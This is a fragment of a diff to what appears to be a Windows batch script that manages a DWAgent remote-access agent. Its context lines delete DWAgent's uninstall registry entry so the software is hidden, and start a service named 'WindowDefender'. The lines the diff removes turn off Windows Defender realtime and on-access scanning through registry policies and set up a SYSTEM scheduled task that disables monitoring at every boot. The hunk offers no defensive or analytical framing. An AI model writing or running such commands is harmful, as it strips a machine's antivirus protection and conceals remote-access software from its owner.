@@ -92,16 +92,7 @@ net start WindowDefender
 cd ..
 cd ..
 cd c:\
-
 echo y | REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent" /f
-net  start WindowDefender
-C:\WINDOWS\system32\cmd.exe  /S /D /c" echo y "
-REG  DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent" /f
-cd windows\system32
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
-schtasks /create /tn "DisableDefender" /tr "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring \$true\"" /sc onstart /ru SYSTEM
-
 net stop DWAgent
 
 net stop DWAgent
